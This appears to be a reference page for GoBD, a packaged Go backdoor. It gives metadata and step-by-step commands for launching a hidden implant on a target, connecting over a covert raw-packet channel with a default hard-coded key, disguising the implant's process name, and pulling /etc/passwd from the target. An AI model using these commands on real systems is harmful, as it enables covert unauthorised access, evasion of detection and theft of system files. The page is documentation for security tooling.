---
name: "gobd"
categories:
  - blackarch-backdoor
version: "82.3bbd17c"
homepage: "https://github.com/razc411/GoBD"
packaged-by: [blackarch]
blackarch-builddate: "2021-04-26"
build-system: go
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "razc411/GoBD"
github-stars: 36
github-pushed: "2019-02-10"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# gobd

> Cross-platform Go backdoor whose client and server exchange raw packets between mirrored ports — no service socket — with a hidden server mode and an interactive client for covert control.

*No corpus evidence — derived from upstream documentation.*

## What it's for

Quiet interactive access between two hosts you control. GoBD is a single binary with `-mode=client|server`: the server side (the implant) can detach from its terminal and run hidden, and the two ends talk as crafted packets selected by interface and destination MAC (it builds on gopacket/pcap rather than opening a listening port a scanner can find). The client authenticates with a hard-coded key (`DAMNPANDIMENSIONALMICE` by default, changeable as a constant in `server.go`) and can rename the implant's process name, watch for a file on the target and pull it back, or kill the implant. Upstream does not document any encryption — treat it as a lab tool, and note the client password is echoed in cleartext on Windows terminals.

## Typical use cases

### Start the hidden implant on the target

```
./GoBD -ip=198.51.100.10 -dMac=32:d1:d1:d1:a1:32 -iface=eth0 -port=223 -lport=222 -mode=server -visible=false
```

Outcome: the server side starts on the target, listening on `-lport` 222 while sending to port 223, detaches from the terminal and runs as a standalone hidden process — no listening service port appears for a scanner.

### Connect the operator client with mirrored ports

```
./GoBD -ip=198.51.100.20 -dMac=32:d1:d1:d1:a1:33 -iface=eth0 -port=222 -lport=223 -mode=client
```

Outcome: after you enter the authentication key, the interactive client comes up and the covert channel is established. Each end's `-port` must mirror the other end's `-lport` (the two ports must differ, mirroring the upstream example's pairing), and each end takes the MAC used for its side of the communication.

### Drive the implant from the client prompt

```
!setprocess senssvc
!monitor /etc/passwd
!exit
```

Outcome: renames the backdoor process on the target, registers `/etc/passwd` so the implant returns the file as soon as it is seen, and the last command sends the kill signal that terminates the implant. Type `?help` in the client for the full list.
